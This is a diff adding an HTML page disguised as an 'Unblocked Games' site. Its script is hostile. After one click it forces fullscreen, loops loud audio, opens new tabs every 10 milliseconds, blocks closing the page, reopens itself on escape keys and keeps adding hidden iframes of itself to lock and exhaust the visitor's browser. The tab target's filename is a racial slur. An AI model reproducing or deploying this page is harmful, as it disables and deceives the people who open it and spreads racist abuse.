@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Unblocked Games</title>
+    <link rel="icon" href="icon.png" type="image/png">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: #000; 
+            height: 100vh; 
+            overflow: hidden; 
+            cursor: none !important; 
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        #clickText {
+            color: #fff;
+            font-size: 3rem;
+            text-align: center;
+            cursor: pointer;
+            animation: pulse 1.5s infinite;
+        }
+        #image {
+            display: none;
+            width: 100vw;
+            height: 100vh;
+            object-fit: cover;
+            position: fixed;
+            top: 0;
+            left: 0;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.2); }
+        }
+    </style>
+</head>
+<body>
+    <div id="clickText">Click anywhere to start!</div>
+    <img id="image" src="image.png" alt="Sigma">
+
+    <script>
+        let activated = false;
+        let tabSpamInterval;
+
+        const activateExperience = () => {
+            if (activated) return;
+            activated = true;
+
+            document.getElementById('clickText').remove();
+            document.getElementById('image').style.display = 'block';
+            const audio = new Audio('Sound.mp3');
+            audio.loop = true;
+            audio.volume = 1.0;
+            audio.play().catch(() => {
+                document.addEventListener('click', () => audio.play(), { once: true });
+            });
+
+            const enterFullscreen = () => {
+                if (!document.fullscreenElement) {
+                    document.documentElement.requestFullscreen().catch(enterFullscreen);
+                }
+            };
+            enterFullscreen();
+
+            setTimeout(() => {
+                tabSpamInterval = setInterval(() => {
+                    window.open('nigger.html', `tab_${Date.now()}`);
+                    window.open('nigger.html', `tab_${Date.now()}_2`);
+                }, 10);
+            }, 500);
+
+            window.onbeforeunload = (e) => {
+                e.preventDefault();
+                e.returnValue = '';
+                window.open(location.href, '_self');
+                return '';
+            };
+
+            document.addEventListener('keydown', (e) => {
+                e.preventDefault();
+                if (['F12','Escape','Tab','r','R'].includes(e.key)) {
+                    window.open(location.href, '_blank');
+                }
+            });
+
+            setInterval(() => {
+                if (!document.fullscreenElement) enterFullscreen();
+                if (!document.hasFocus()) window.focus();
+                document.body.innerHTML += `<iframe src="${location.href}" style="display:none"></iframe>`;
+            }, 1000);
+        };
+
+        document.addEventListener('click', activateExperience);
+        document.addEventListener('contextmenu', e => e.preventDefault());
+    </script>
+</body>
+</html>
